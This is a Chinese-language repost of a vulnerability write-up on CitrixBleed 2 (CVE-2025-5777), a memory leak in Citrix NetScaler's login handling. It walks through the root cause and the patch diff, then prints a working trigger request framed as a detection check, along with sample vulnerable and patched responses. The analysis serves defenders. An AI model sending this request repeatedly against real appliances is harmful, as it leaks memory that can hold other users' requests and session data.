<!DOCTYPE html><html lang=zh><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/libs/highlight/styles/18k.css><meta name=generator content="Hexo 7.3.0"></head><body id=bodyx><div class="hd posts"><a href=javascript:history.back() class=replay-btn>返回</a><div class=post-title><p>Citrix NetScaler 内存泄露（CitrixBleed 2 CVE-2025-5777）</p><hr></div><div class=post-content><h1 id=如何还能继续流血？-Citrix-NetScaler-内存泄露（CitrixBleed-2-CVE-2025-5777）><a href=#如何还能继续流血？-Citrix-NetScaler-内存泄露（CitrixBleed-2-CVE-2025-5777） class=headerlink title="如何还能继续流血？- Citrix NetScaler 内存泄露（CitrixBleed 2 CVE-2025-5777）"></a>如何还能继续流血？- Citrix NetScaler 内存泄露（CitrixBleed 2 CVE-2025-5777）</h1><p>在您深入阅读我们最新的长篇大论之前，请允许我们带您踏上一段旅程。</p><p>坐在您的椅子上，站在您的办公桌旁，舔一下您的手机屏幕——闭上眼睛，想象一个美好的世界。外面阳光明媚，鸟儿在歌唱，而您的“设计即安全”承诺戒指感觉非常棒。</p><p>您决定在一个周末构建一个网络。为什么？因为您可以。</p><p>星期六的早晨到了，您坐在那里（自然地，Bambi 在您身边）构建您的网络。“我应该使用什么来帮助保护我的环境及其访问权限？” 您思考着。显然，由于您缺乏独立思考的能力，您把这个问题输入了 ChatGPT——“真幸运，有一个完整的行业在生产企业级、价格昂贵的安全远程访问设备！”</p><p>“太棒了”您一边得意地微笑，一边部署了您选择的解决方案，拍拍自己的背然后转向其他事情。“能够如此安全地完成这些事情不是很惬意吗？” 您自言自语。</p><p>然后您醒来并意识到：</p><ul><li>现在是2025年</li><li>每个人都在嘲笑您，因为您睡在办公桌上，在一个参与奖杯上流口水</li><li>您的网络刚刚被7个APT组织破坏，他们都拥有针对您部署的安全远程网络访问设备的不同零日漏洞。</li></ul><p>在过去几周内，关于影响 Citrix Netscaler 设备的两个野外利用漏洞的讨论非常热烈：</p><ul><li>CVE-2025-5777</li><li>CVE-2025-6543</li></ul><p>今天，我们将重点讨论 CVE-2025-5777，Citrix 对此的描述如下：</p><ul><li>当NetScaler配置为网关（VPN虚拟服务器、ICA代理、CVPN、RDP代理）或AAA虚拟服务器时，输入验证不足导致内存过度读取。</li></ul><p>这听起来……可疑地……类似于被称为 CitrixBleed（旧版本，不是新版本——令人沮丧的是我们可以这么说）的漏洞 <strong>CVE-2023-4966</strong>。</p><p>CitrixBleed 臭名昭著，因为它是一个严重的漏洞，允许内存泄露和随后的远程会话劫持，并且两年后，我们仍在为其广泛利用所带来的后果而痛苦。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_4.jpg></p><p>之前，我们曾表示无意发布此漏洞分析。目前，上述两个2025年的（新的）漏洞正在遭受野外攻击，但仍有大量 Citrix Netscaler 用户<strong>尚未修补。</strong></p><p>正如我们之前所讨论的，我们在最喜欢的磁铁旁边有一个道德指南针，并用它来指导我们的决策过程。</p><p>然而，我们一直在幕后积极参与，与 watchTowr 平台用户群分享信息和重现器，他们依靠我们的技术快速确定其暴露程度，并与众多行业机构合作，以在全球范围内做出更广泛的响应。</p><p>我们被告知，以IoCs、利用工件等形式的信息共享对于 Citrix NetScaler 最终用户来说是有益的，但这种共享似乎……“很少”，这使得这些用户在决定是否需要发出内部警报时处于艰难的位置。</p><p>以下是一个假设但又过于熟悉的场景，说明这如何影响我们所有人：</p><ul><li>野外的利用正在肆虐</li><li>您的基础设施团队已经说服自己他们没有受到影响</li><li>您无法枚举设备的版本，因为这是一个经过身份验证的功能，而您不被允许访问</li><li>您没有任何IoCs或利用工件可以要求任何人检查或查询日志</li><li>除非能证明有实质性的问题，否则补丁将继续按照SLAs进行</li><li>同时，世界正在燃烧</li><li>CitrixBleed相关入侵的长期后果再次出现</li><li><a target=_blank rel=noopener href="https://therecord.media/hhs-warns-of-citrix-bleed-bug?ref=labs.watchtowr.com">在某个时刻，一家医院被下线。</a></li></ul><p>现在，是的，公平地说，我们显然完全编造了这一切，一些随机社交媒体网站上的自封的知识分子确实从他们粘合乐高积木和吃蜡笔的经验中了解得更多。</p><p>但是，鉴于我们想相信自己编造的情景，因此我们做出了以下决定：</p><ul><li>发布分析，确保不仅仅是“坏人”能够识别易受攻击的设备</li><li>发布重现器，它们不会作为武器化的PoC，但将允许对目标 Citrix Netscaler 设备是否脆弱进行可靠、基于证据的判断。</li><li>今天不会发布任何检测工件生成器。</li></ul><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_5.jpg></p><h2 id=它就在你眼前><a href=#它就在你眼前 class=headerlink title=它就在你眼前></a>它就在你眼前</h2><p>您已经无数次看到过这个页面——这是您最喜欢的 Citrix 网关登录页面。漏洞就在这里 - 您看到了吗？</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_6.jpg></p><p>再仔细看看。仍然没看见？</p><p>好吧，让我们进一步探讨。当您尝试使用此表单向 Citrix Netscaler 进行身份验证时，会发生以下 HTTP 请求和响应：</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_7.jpg></p><p>这是一个相当简单的请求，对于身份验证机制来说结构并不异常。对于响应也是如此——典型的失败身份验证尝试的响应。</p><p>如果我们向下滚动返回的 XML，可以看到 XML 标签 <code>&lt;InitialValue&gt;&lt;/InitialValue&gt;</code> 中反映了我们选择的用户名。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_8.jpg></p><p>“很棒，watchTowr - 非常有启发性。” 好的，继续跟着我们。</p><p>如果我们给 <code>login</code> 参数和值多加关注，因为我们至少有一些可控的东西，会发生什么呢。</p><p>让我们尝试重放相同的请求，同时<strong>仅保留</strong> <code>login</code> 参数。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_9.jpg></p><p>神奇，有什么东西仍然在反映我们的输入。让我们继续制造麻烦…</p><p>如果我们删除分配给 <code>login</code> 参数的值呢？我们期望的是 XML 响应中的 <code>&lt;InitialValue&gt;&lt;/InitialValue&gt;</code> 标签的内容为空——但同样，让我们看看。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_10.jpg></p><p>这很有意义——可能后台逻辑在处理登录请求时执行了一个简单的检查，例如：</p><blockquote><p>“如果 <code>login</code> 参数存在但其值为空，则相应的后端变量（例如结构成员 -&gt;username 或者甚至本地缓冲区）也应该初始化为…嗯，空！”</p></blockquote><p>同样，这种行为在认证功能中很典型。后端经常将传入的表单数据解析成一个结构或对象，尤其是当你分心并且更关心 Y2K 的时候决定编写自己的认证代码。</p><p>如果 <code>login</code> 参数没有值，那么它映射的字段会被赋值为空字符串或 NULL。</p><p>然而，这里的事情变得有趣了。在这种类型的实现中，奇怪的事情可能会发生，因为解析逻辑通常是荒谬的。</p><p>如果我们只提供 <code>login</code> 参数，但不提供等号或值（由 HTTP 规范预期）以尝试触发解析问题怎么办？</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_11.jpg></p><p>呃…好…好的……</p><p>我们相当确定这很奇怪——也许这是矩阵中的一个小故障，或者可能是某种内存泄漏？</p><p>让我们再次发送我们的请求……</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_12.jpg></p><p>几乎令人沮丧的是，看起来我们的直觉是正确的——看来我们已经找到了并重现了 CVE-2025-5777，因为我们看到了极其复杂的内存泄漏迹象。</p><p>这里的根本原因是一个经典的 C 语言恶作剧。后端解析器最终给我们返回了一个未初始化的局部变量。该变量本应该用 <code>login</code> 参数提供的用户名正确初始化（即 <code>login=username</code>）。</p><p>但是，如前所述，考虑到上面的例子中我们根本没有提供 <code>login</code> 参数的值，服务器最终返回的是堆栈上遗留的垃圾数据。这是一个教科书般的 CWE-457：使用未初始化变量。</p><p>换句话说，当输入部分形成或缺失时，后端不会安全地清零或初始化相应的内存，结果我们泄露了占据该内存空间的残余数据。</p><h2 id=根因分析><a href=#根因分析 class=headerlink title=根因分析></a>根因分析</h2><p>现在，我们已经简化了整个流程以描绘一幅清晰的画面——让我们深入探讨根本原因。</p><p>当我们开始典型的补丁差异分析过程时，我们立即面临了一个重大挑战。</p><p>根据我们对这些设备的经验，我们怀疑漏洞位于臭名昭著的 <code>/netscaler/nsppe</code> 中。该二进制文件代表了 NetScaler 数据包处理引擎——Citrix NetScaler 解决方案的核心组件。</p><p>不过，生活从来不会那么容易，我们立刻遇到了一个重大挑战——一个静态编译的二进制文件，其中包含数千处变化（看起来几乎是故意阻碍，Citrix…）。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_13.jpg></p><p>在深入这一过程时，我们选择了两个版本的 <code>/netscaler/nsppe</code> 二进制文件进行比较，作为我们的补丁差异分析的一部分：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">14.1.47.46.64 [已修补]<br>14.1.43.50.64 [易受攻击]<br></code></pre></td></tr></table></figure><p>顺便提一下，Diaphora 和 Bindiff 在对比这两个版本的二进制文件时都遇到了很大的困难，因为其体积庞大且噪音太多，但我们还是完成了。</p><p>我们的分析表明，Citrix 对此漏洞的修复似乎是以下代码行。我们知道这看起来模糊不清，<code>&amp; 0x10</code> 如何防止泄露？！</p><p>我们的分析显示，Citrix 对此问题的修复基本上归结为这一行：</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_14.jpg></p><p>我们理解这看起来模糊——<code>&amp; 0x10</code> 和防止内存泄漏有什么关系？</p><p>好吧，我们的猜测是，这很可能与一个标志有关，该标志指示是否在 <code>login</code> 参数中提供了用户名。</p><p>请参见以下伪代码示例：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">if (postData-&gt;hasField(&#x27;login&#x27;)) &#123;<br>    loginContext-&gt;hasUsername |= 0x10;<br>    // &quot;我们看到了登录字段，所以标记我们有一个用户名&quot;<br>&#125;<br></code></pre></td></tr></table></figure><p>该 <code>if</code> 条件并未明确检查 <code>login=</code> 或 <code>login</code> 参数是否有值——它只是问：“HTTP POST 主体是否包含字段 <code>login</code>？”。</p><p>如果是的话，它就会翻转 <code>hasUsername</code> 位，进而表明“提供了用户名”。之后，另一段代码将一个本地缓冲区设置为所提供用户名的值。然而，由于我们没有提供任何值，缓冲区最终未初始化。</p><p>下一个我们需要问的问题是：哪个函数负责将内容泄露回给我们？</p><p>如果我们查看之前获得的 HTTP 响应，我们知道我们的内存泄漏被包裹在一个名为 <code>&lt;InitialValue&gt;</code> 的 XML 标签中。在 <code>nsppe</code> 二进制文件中搜索此字符串及其引用会产生多个命中。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_15.jpg></p><p>经过审查后，我们确定了我们实际感兴趣的那一个。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_16.jpg></p><p>让我们更仔细地看一下使用的格式字符串（以及上面截图中显示的内容）：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">&lt;InitialValue&gt;%.*s&lt;/InitialValue&gt;<br></code></pre></td></tr></table></figure><p>我相信大多数人熟悉 <code>%s</code> 及其功能——但 <code>%.*s</code> 中的 <code>.*</code> 是什么意思呢？</p><p><code>%.*s</code> 格式告诉 <code>snprintf</code>：“打印最多 N 个字符，或者在第一个空字节 (<code>\0</code>) 处停止——以先到者为准。”那个空字节最终会在内存中的某处出现，所以虽然泄漏不会无限期运行，但每次调用你仍然可以获得几个字节。</p><p>所以，每次你在没有 <code>=</code> 的情况下命中该端点时，都会将更多的未初始化堆栈数据拉入响应中。</p><p>重复足够多次，最终，你可能会找到有价值的东西。</p><p>惊喜——这正是我们接下来做的事情。</p><h2 id=泄露内存><a href=#泄露内存 class=headerlink title=泄露内存></a>泄露内存</h2><p>为了测试我们的理论，我们决定简单地发送一个 HTTP 请求，其中在 User-Agent 头中包含容易识别的字符串。</p><p>如下图所示，我们在 User-Agent 头中多次重复使用了字符串“watchTowr”。发送一次 HTTP 请求不会增加我们在未初始化缓冲区中找到我们虚构字符串的机会，所以我们决定只是不断发送请求。</p><p>利用我们自己的检测工件生成器，我们不断地冲击端点，持续使服务器泄漏内存，并观察泄漏中的独特标记。</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_17.jpg></p><p>继续观察，最终我们会得到我们想要的值返回——证明我们可以成功从内存中读取 HTTP 请求：</p><p>0:00<br>&#x2F;0:22</p><p>1×</p><p>如您所见，每次泄漏的内存量是不同的——为什么？</p><p>正如我们前面提到的，由于格式字符串是 <code>%.*s</code> ，内存泄漏在遇到内存中的空字节之前停止。然而，如果我们反复尝试泄漏内存，我们会增加运气的几率，从而泄露另一个用户的 HTTP 请求：</p><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_18.jpg></p><p>需要注意的是，在我们的测试过程中，<strong>没有发现任何 cookie、会话 ID 或密码</strong>出现在泄漏的内容中。</p><p>由于这是一个内存泄漏且本质上是非确定性的，运行工具更长时间可能会最终显示出更有价值的东西。或者更清楚地说，我们相信出于某些原因，“生产”环境中建立了 VPN 连接的情况下，我们更容易在捕获的内存泄漏中看到敏感信息。</p><h2 id=检测策略><a href=#检测策略 class=headerlink title=检测策略></a>检测策略</h2><p>要识别易受攻击的主机，请使用以下 HTTP 请求：</p><p>HTTP 请求：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">POST /p/u/doAuthentication.do HTTP/1.0<br>Host: target<br>User-Agent: watchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowrwatchTowr<br>Content-Length: 5<br>Connection: keep-alive<br><br>login<br></code></pre></td></tr></table></figure><p>一旦发送到 Citrix Netscaler，HTTP 响应中的 <code>&lt;InitialValue&gt;&lt;/InitialValue&gt;</code> 格式足以确定可利用性和漏洞（我们在这里详细说明以便您可以构建自己的机制）：</p><p>易受攻击的响应示例：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">HTTP/1.1 200 OK<br>X-Content-Type-Options: nosniff<br>X-XSS-Protection: 1; mode=block<br>Connection: close<br>Content-Length: 1962<br>Cache-control: no-cache, no-store, must-revalidate<br>Pragma: no-cache<br>Content-Type: application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8<br>X-Citrix-Application: Receiver for Web<br><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;<br>&lt;AuthenticateResponse<br>	xmlns=&quot;&lt;http://citrix.com/authentication/response/1&gt;&quot;&gt;<br>	&lt;Status&gt;success&lt;/Status&gt;<br>	&lt;Result&gt;more-info&lt;/Result&gt;<br>	&lt;StateContext&gt;bG9naW5zY2hlbWE9ZGVmYXVsdA==&lt;/StateContext&gt;<br>	&lt;AuthenticationRequirements&gt;<br>		&lt;PostBack&gt;/p/u/doAuthentication.do&lt;/PostBack&gt;<br>		&lt;CancelPostBack&gt;/p/u/doLogoff.do&lt;/CancelPostBack&gt;<br>		&lt;CancelButtonText&gt;Cancel&lt;/CancelButtonText&gt;<br>		&lt;Requirements&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;Type&gt;none&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Label&gt;<br>					&lt;Type&gt;nsg-login-heading&lt;/Type&gt;<br>					&lt;Text&gt;nsg_loginHeading&lt;/Text&gt;<br>				&lt;/Label&gt;<br>			&lt;/Requirement&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;ID&gt;login&lt;/ID&gt;<br>					&lt;SaveID&gt;login&lt;/SaveID&gt;<br>					&lt;Type&gt;username&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Label&gt;<br>					&lt;Text&gt;nsg_username&lt;/Text&gt;<br>					&lt;Type&gt;nsg-login-label&lt;/Type&gt;<br>				&lt;/Label&gt;<br>				&lt;Input&gt;<br>					&lt;Text&gt;<br>						&lt;ReadOnly&gt;false&lt;/ReadOnly&gt;<br>						&lt;InitialValue&gt;É|¼C÷PkÓßYsa5ÊÞÅÐ­^Ð|@ºJZõ¶@¹^ì¶Uã7Kèg ­Oë@¼~hL1&#123;Xövn^ÐÛ·¹8dp&#125;°$üüÇ)7<br>(÷æ¾èÂpAgc¼TowrwatchTowrw&lt;/InitialValue&gt;<br>						&lt;Constraint&gt;.+&lt;/Constraint&gt;<br>					&lt;/Text&gt;<br>				&lt;/Input&gt;<br>			&lt;/Requirement&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;ID&gt;passwd&lt;/ID&gt;<br>					&lt;SaveID&gt;passwd&lt;/SaveID&gt;<br>					&lt;Type&gt;password&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Label&gt;<br>					&lt;Text&gt;nsg_password1&lt;/Text&gt;<br>					&lt;Type&gt;nsg-login-label&lt;/Type&gt;<br>				&lt;/Label&gt;<br>				&lt;Input&gt;<br>					&lt;Text&gt;<br>						&lt;Secret&gt;true&lt;/Secret&gt;<br>						&lt;Constraint&gt;.+&lt;/Constraint&gt;<br>					&lt;/Text&gt;<br>				&lt;/Input&gt;<br>			&lt;/Requirement&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;ID&gt;savecredentials&lt;/ID&gt;<br>					&lt;SaveID&gt;&lt;/SaveID&gt;<br>					&lt;Type&gt;savecredentials&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Label&gt;<br>					&lt;Text&gt;Remember my credentials&lt;/Text&gt;<br>					&lt;Type&gt;plain&lt;/Type&gt;<br>				&lt;/Label&gt;<br>				&lt;Input&gt;<br>					&lt;AssistiveText&gt;&lt;/AssistiveText&gt;<br>					&lt;CheckBox&gt;<br>						&lt;InitialValue&gt;false&lt;/InitialValue&gt;<br>					&lt;/CheckBox&gt;<br>				&lt;/Input&gt;<br>			&lt;/Requirement&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;ID&gt;nsg-x1-logon-button&lt;/ID&gt;<br>					&lt;Type&gt;none&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Input&gt;<br>					&lt;Button&gt;Log On&lt;/Button&gt;<br>				&lt;/Input&gt;<br>				&lt;Label&gt;<br>					&lt;Type/&gt;<br>				&lt;/Label&gt;<br>			&lt;/Requirement&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;ID&gt;l20n-error&lt;/ID&gt;<br>					&lt;SaveID&gt;&lt;/SaveID&gt;<br>					&lt;Type&gt;none&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Label&gt;<br>					&lt;Text&gt;Try again after some time or contact your help desk&lt;/Text&gt;<br>					&lt;Type&gt;nsg-l20n-error&lt;/Type&gt;<br>				&lt;/Label&gt;<br>				&lt;Input/&gt;<br>			&lt;/Requirement&gt;<br>		&lt;/Requirements&gt;<br>	&lt;/AuthenticationRequirements&gt;<br>&lt;/AuthenticateResponse&gt;<br></code></pre></td></tr></table></figure><p>修补后的响应示例（有很多）：</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">HTTP/1.1 200 OK<br>X-Content-Type-Options: nosniff<br>X-XSS-Protection: 1; mode=block<br>Connection: close<br>Content-Length: 668<br>Cache-control: no-cache, no-store, must-revalidate<br>Pragma: no-cache<br>Content-Type: application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8<br>X-Citrix-Application: Receiver for Web<br><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;<br>&lt;AuthenticateResponse<br>	xmlns=&quot;&lt;http://citrix.com/authentication/response/1&gt;&quot;&gt;<br>	&lt;Status&gt;success&lt;/Status&gt;<br>	&lt;Result&gt;more-info&lt;/Result&gt;<br>	&lt;StateContext&gt;&lt;/StateContext&gt;<br>	&lt;AuthenticationRequirements&gt;<br>		&lt;PostBack&gt;/nf/auth/doAuthentication.do&lt;/PostBack&gt;<br>		&lt;CancelPostBack&gt;/nf/auth/doLogoff.do&lt;/CancelPostBack&gt;<br>		&lt;CancelButtonText&gt;Cancel&lt;/CancelButtonText&gt;<br>		&lt;Requirements&gt;<br>			&lt;Requirement&gt;<br>				&lt;Credential&gt;<br>					&lt;ID&gt;l20n-error&lt;/ID&gt;<br>					&lt;SaveID&gt;&lt;/SaveID&gt;<br>					&lt;Type&gt;none&lt;/Type&gt;<br>				&lt;/Credential&gt;<br>				&lt;Label&gt;<br>					&lt;Text&gt;No active policy during authentication&lt;/Text&gt;<br>					&lt;Type&gt;....&lt;/Type&gt;<br>				&lt;/Label&gt;<br>				&lt;Input/&gt;<br>			&lt;/Requirement&gt;<br>		&lt;/Requirements&gt;<br>	&lt;/AuthenticationRequirements&gt;<br>&lt;/AuthenticateResponse&gt;<br></code></pre></td></tr></table></figure><blockquote><p>应当注意的是，我们认为检测最可靠的方法是在发送没有 <code>=</code> 和值的 <code>login</code> 参数时，确保 <code>&lt;InitalValue&gt;&lt;/InitialValue&gt;</code> 块返回为空内容。</p></blockquote><p><img src=http://www.18k.icu/images/20250704_20_61esykop/img_19.jpg></p></div></div><div class=footer id=footer><p>Copyright © 2025 <a class=flink target=_blank rel=noopener href=http://www.18k.icu>www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style=vertical-align:sub><input type=checkbox name=switch id=update_style> <span class=el-switch-style></span></label></p></div><input type=hidden id=web_style value=black> <input type=hidden id=valine_appid value=CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz> <input type=hidden id=valine_appKey value=FqiyUqbg7McKN2eG0MCewupf><script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js></script><script src=/libs/highlight/highlight.pack.js></script><script src=/js/js.js></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>